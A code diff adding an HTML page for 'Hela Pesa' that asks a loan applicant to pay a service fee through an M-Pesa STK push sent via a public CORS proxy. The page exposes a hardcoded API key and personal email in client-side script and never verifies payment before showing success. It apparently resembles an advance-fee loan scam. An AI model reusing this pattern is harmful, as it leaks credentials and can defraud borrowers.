@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Payment Verification - Hela Pesa</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="bg-gradient-to-br from-red-700 via-red-600 to-red-500 text-white min-h-screen px-4 py-6 font-sans">
+
+  <!-- Header -->
+  <div class="flex items-center gap-3 mb-6">
+    <img src="zashlogo.png" alt="Hela Pesa Logo" class="w-12 h-12 rounded-full">
+    <h1 class="text-2xl font-bold">Hela Pesa</h1>
+  </div>
+
+  <!-- Loan Summary -->
+  <div class="bg-white bg-opacity-10 p-4 rounded-xl mb-6">
+    <h2 class="text-xl font-semibold mb-2">Loan Summary</h2>
+    <p><strong>Loan Amount:</strong> Ksh <span id="amount">-</span></p>
+    <p><strong>Service Fee:</strong> Ksh <span id="fee">-</span></p>
+    <p><strong>Request Date:</strong> <span id="requestDate">-</span></p>
+    <p><strong>Due Date:</strong> <span id="dueDate">-</span></p>
+    <p><strong>M-Pesa Number:</strong> <span id="phone">-</span></p>
+  </div>
+
+  <!-- Payment Section -->
+  <div class="bg-white bg-opacity-10 p-4 rounded-xl mb-6 text-center shadow-lg border border-white border-opacity-20">
+    <h2 class="text-2xl font-bold mb-2">📲 Automatic Payment</h2>
+    <p class="mb-4 text-sm text-gray-200">
+      Click below to send an M-Pesa prompt securely to your phone.<br>
+      Enter your PIN to pay the Ksh <strong id="payAmount" class="text-yellow-300 text-lg">-</strong> fee.
+    </p>
+    
+    <!-- Status message -->
+    <div id="statusMsg" class="hidden mb-4 p-3 bg-black bg-opacity-30 rounded text-sm transition-all duration-300 border border-transparent font-medium"></div>
+
+    <!-- Submit Button -->
+    <button id="payBtn" onclick="pay()"
+      class="w-full bg-yellow-400 text-black font-bold py-3 rounded-full hover:bg-yellow-300 shadow-[0_0_15px_rgba(250,204,21,0.5)] transition-all flex justify-center items-center gap-2">
+      Initiate STK Push
+    </button>
+  </div>
+
+  <script>
+    const data = JSON.parse(localStorage.getItem('loanRequest')) || {};
+
+    document.getElementById('amount').textContent = data.amount?.toLocaleString() || '-';
+    document.getElementById('fee').textContent = data.serviceFee?.toLocaleString() || '-';
+    document.getElementById('requestDate').textContent = data.requestDate || '-';
+    document.getElementById('dueDate').textContent = data.dueDate || '-';
+    document.getElementById('phone').textContent = data.phone || '-';
+    
+    const serviceFee = data.serviceFee || 0;
+    document.getElementById('payAmount').textContent = serviceFee.toLocaleString();
+    
+    // Format Phone number to 254...
+    let rawPhone = data.phone || '';
+    if(rawPhone.startsWith('0')) {
+        rawPhone = '254' + rawPhone.slice(1);
+    } else if(rawPhone.startsWith('+254')) {
+        rawPhone = rawPhone.slice(1);
+    }
+    const msisdn = rawPhone;
+
+    async function pay() {
+      const btn = document.getElementById("payBtn");
+      const statusMsg = document.getElementById("statusMsg");
+      
+      if (!msisdn) {
+        alert("Invalid phone number.");
+        return;
+      }
+
+      btn.disabled = true;
+      btn.innerHTML = `<svg class="animate-spin h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Processing...`;
+      
+      statusMsg.classList.remove('hidden');
+      statusMsg.className = 'mb-4 p-3 bg-black bg-opacity-30 rounded text-sm transition-all duration-300 font-medium text-white';
+      statusMsg.innerHTML = 'Connecting to M-Pesa...';
+
+      try {
+        const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent('https://megapay.co.ke/backend/v1/initiatestk');
+        const response = await fetch(proxyUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            api_key: 'MGPYCN5rjePf',
+            email: 'kemeirowan@gmail.com',
+            amount: String(serviceFee),
+            msisdn: msisdn,
+            reference: 'Hakika_' + Math.floor(Math.random() * 1000000)
+          })
+        });
+
+        const resText = await response.text();
+        console.log('Megapay response:', resText);
+        
+        try {
+          const resJSON = JSON.parse(resText);
+          if (response.ok || resJSON.status || resJSON.ResponseCode === "0") {
+            statusMsg.className = 'mb-4 p-3 bg-green-500 bg-opacity-20 border border-green-500 rounded text-sm transition-all duration-300 text-green-300 font-medium';
+            statusMsg.innerHTML = '✅ STK Push sent! Please check your phone and enter your M-Pesa PIN.';
+            
+            btn.innerHTML = "I Have Paid (Confirm)";
+            btn.disabled = false;
+            btn.onclick = () => {
+               window.location.href = "success.html";
+            };
+          } else {
+             throw new Error(resJSON.message || "Failed to initiate payment");
+          }
+        } catch (err) {
+            console.error(err);
+            throw new Error("Payment initialization failed");
+        }
+      } catch (error) {
+        console.error("Payment error:", error);
+        statusMsg.className = 'mb-4 p-3 bg-red-500 bg-opacity-20 border border-red-500 rounded text-sm transition-all duration-300 text-red-300 font-medium';
+        statusMsg.innerHTML = '❌ Could not send STK Push. Please try again.';
+        btn.innerHTML = "Retry Payment";
+        btn.disabled = false;
+      }
+    }
+  </script>
+</body>
+
+</html>
